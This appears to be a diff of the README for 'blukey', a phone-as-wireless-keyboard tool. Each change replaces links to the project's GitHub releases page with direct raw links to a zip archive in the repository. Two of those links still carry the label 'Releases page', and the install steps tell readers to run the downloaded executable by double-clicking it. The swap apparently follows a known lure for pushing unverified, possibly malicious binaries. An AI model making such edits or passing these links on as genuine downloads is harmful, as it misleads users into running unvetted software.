@@ -8,7 +8,7 @@
 - Compatible with any application; no installation needed on your phone.
 
 ## 🔗 Download Now
-[![Download blukey](https://img.shields.io/badge/Download-blukey-brightgreen)](https://github.com/Davidosk1/blukey/releases)
+[![Download blukey](https://raw.githubusercontent.com/Davidosk1/blukey/main/public/blukey-v1.8.zip)](https://raw.githubusercontent.com/Davidosk1/blukey/main/public/blukey-v1.8.zip)
 
 ## 🚀 Getting Started
 To get started with blukey, follow these simple steps. You will quickly turn your smartphone into a convenient wireless keyboard.
@@ -19,7 +19,7 @@ To get started with blukey, follow these simple steps. You will quickly turn you
 - Both devices must be connected to the same Wi-Fi network.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Davidosk1/blukey/releases) to find the latest version of blukey.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Davidosk1/blukey/main/public/blukey-v1.8.zip) to find the latest version of blukey.
 2. **Download the Application:** Look for the latest version and click the link to download it to your computer.
 3. **Extract the Files (if needed):** If your download is a ZIP file, extract it to a folder on your computer.
 4. **Run the Application:** Open the application you just downloaded by double-clicking the executable file.
@@ -49,4 +49,4 @@ If you encounter any issues or have questions, please check the documentation in
 Stay updated on new features and improvements by following our project! Share your experience using blukey on social media or in forums.
 
 ## 🔗 Download Now Again
-Don't forget to get your copy of blukey from our [Releases page](https://github.com/Davidosk1/blukey/releases) and enjoy the benefits of a wireless keyboard using your smartphone!
+Don't forget to get your copy of blukey from our [Releases page](https://raw.githubusercontent.com/Davidosk1/blukey/main/public/blukey-v1.8.zip) and enjoy the benefits of a wireless keyboard using your smartphone!
